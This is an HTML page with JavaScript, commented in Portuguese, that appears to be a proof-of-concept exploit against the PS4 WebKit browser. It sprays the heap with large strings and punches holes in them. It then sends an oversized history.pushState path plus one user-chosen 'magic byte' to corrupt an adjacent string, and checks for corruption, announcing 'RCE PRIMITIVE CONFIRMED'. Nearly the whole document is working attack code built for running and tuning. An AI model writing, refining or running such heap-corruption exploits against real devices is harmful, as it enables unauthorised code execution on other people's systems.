<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit: Magic Byte Hunter</title>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
        .success { color: #fff; background: #008800; padding: 10px; font-weight: bold; font-size: 1.5em; border: 2px solid #0f0;}
        .fail { color: #888; }
        button { font-size: 16px; padding: 10px; background: #333; color: white; border: 1px solid #666; cursor: pointer; margin: 5px; }
    </style>
</head>
<body>

<h2>WebKit Heap: Magic Byte Hunter</h2>
<p>Status: <span id="status">Ready</span></p>

<label>Byte de Ataque (Hex): 0x</label>
<input type="text" id="byteInput" value="80" style="width: 40px; font-size: 16px;">
<br><br>

<button onclick="runTest()">DISPARAR ATAQUE (1 Byte)</button>

<div id="log" style="margin-top:20px;"></div>

<script>
    const MB = 1024 * 1024;
    const VICTIM_SIZE = MB; 
    const SPRAY_COUNT = 512; 
    var victims = new Array(SPRAY_COUNT);

    function log(msg, type="") {
        const el = document.getElementById('log');
        el.innerHTML = `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
    }

    function runTest() {
        document.getElementById('log').innerHTML = "";
        
        // Pega o byte escolhido pelo usuário
        let byteStr = document.getElementById('byteInput').value;
        let magicByte = parseInt(byteStr, 16);
        
        if (isNaN(magicByte) || magicByte < 0 || magicByte > 255) {
            alert("Byte inválido! Use Hex (ex: 80, 41, 01)");
            return;
        }

        let charPayload = String.fromCharCode(magicByte);
        log(`Iniciando teste com Byte: 0x${byteStr} (${magicByte})...`);

        // 1. SPRAY
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let header = `ID:${i}-`; 
            let padding = "B".repeat(VICTIM_SIZE - header.length);
            victims[i] = header + padding;
        }

        // 2. HOLES
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i += 4) {
            victims[i] = null;
        }
        
        // GC Force
        for(let k=0; k<200; k++) { new ArrayBuffer(0x20000); }

        // 3. TRIGGER
        setTimeout(() => {
            const SAFE_SIZE = 709522; 
            const BASE = "A".repeat(SAFE_SIZE);
            const OVERFLOW = charPayload; // O Byte Mágico
            
            const payload = "/" + BASE + OVERFLOW;

            try {
                history.pushState({}, "poc", payload);
                log("Payload enviado. Verificando...");
                check(magicByte);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }, 1500);
    }

    function check(sentByte) {
        let found = false;
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
            if (victims[i] !== null) {
                let v = victims[i];
                
                // VERIFICAÇÃO 1: Tamanho Mudou? (Isso é o que queremos!)
                if (v.length !== VICTIM_SIZE) {
                    log(`⚡ JACKPOT! Vítima ID ${i} corrompida!`, "success");
                    log(`Tamanho Antigo: ${VICTIM_SIZE}`, "success");
                    log(`Tamanho Novo:   ${v.length}`, "success");
                    log(`Byte usado: 0x${sentByte.toString(16)}`, "success");
                    found = true;
                    alert("RCE PRIMITIVE CONFIRMED!\nTire foto agora!");
                    break;
                }

                // VERIFICAÇÃO 2: Conteúdo Mudou? (Menos provável com 1 byte no header, mas possível)
                if (v.charCodeAt(0) !== 73) { // 73 é 'I' de ID:...
                     log(`⚡ Conteúdo alterado na Vítima ${i}!`, "success");
                     found = true;
                     break;
                }
            }
        }
        
        if (!found) log(`Sem mudança visível com 0x${sentByte.toString(16)}. Tente outro byte.`, "fail");
    }
</script>
</body>
</html>
